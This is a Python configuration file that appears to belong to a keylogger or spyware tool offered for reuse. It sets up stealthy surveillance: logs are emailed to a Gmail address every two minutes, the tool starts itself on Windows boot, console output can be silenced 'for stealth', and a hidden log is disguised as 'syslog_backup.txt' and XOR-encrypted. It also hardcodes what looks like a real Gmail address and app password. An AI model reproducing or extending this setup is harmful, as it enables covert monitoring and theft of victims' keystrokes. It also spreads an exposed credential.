
'''Change the config settings to your own'''

# Email Configuration
EMAIL_SENDER = 'tobi53154@gmail.com'
EMAIL_PASSWORD = 'ufsvdpunejmeonid'  # Gmail app password
EMAIL_RECEIVER = 'tobi53154@gmail.com'

# Behavioral Configuration
SEND_INTERVAL = 120  # Seconds between email sends
DEBUG = True         # Set to False to disable console prints for stealth
PERSISTENCE = True   # Set to True to enable auto-start on Windows boot

# Logging & Security
LOG_FILE_NAME = 'syslog_backup.txt'  # Hidden backup log file
ENCRYPTION_KEY = 'super-secret-key-123'  # Key for simple XOR encryption
ENCRYPT_LOGS = True  # Whether to encrypt the local backup logs
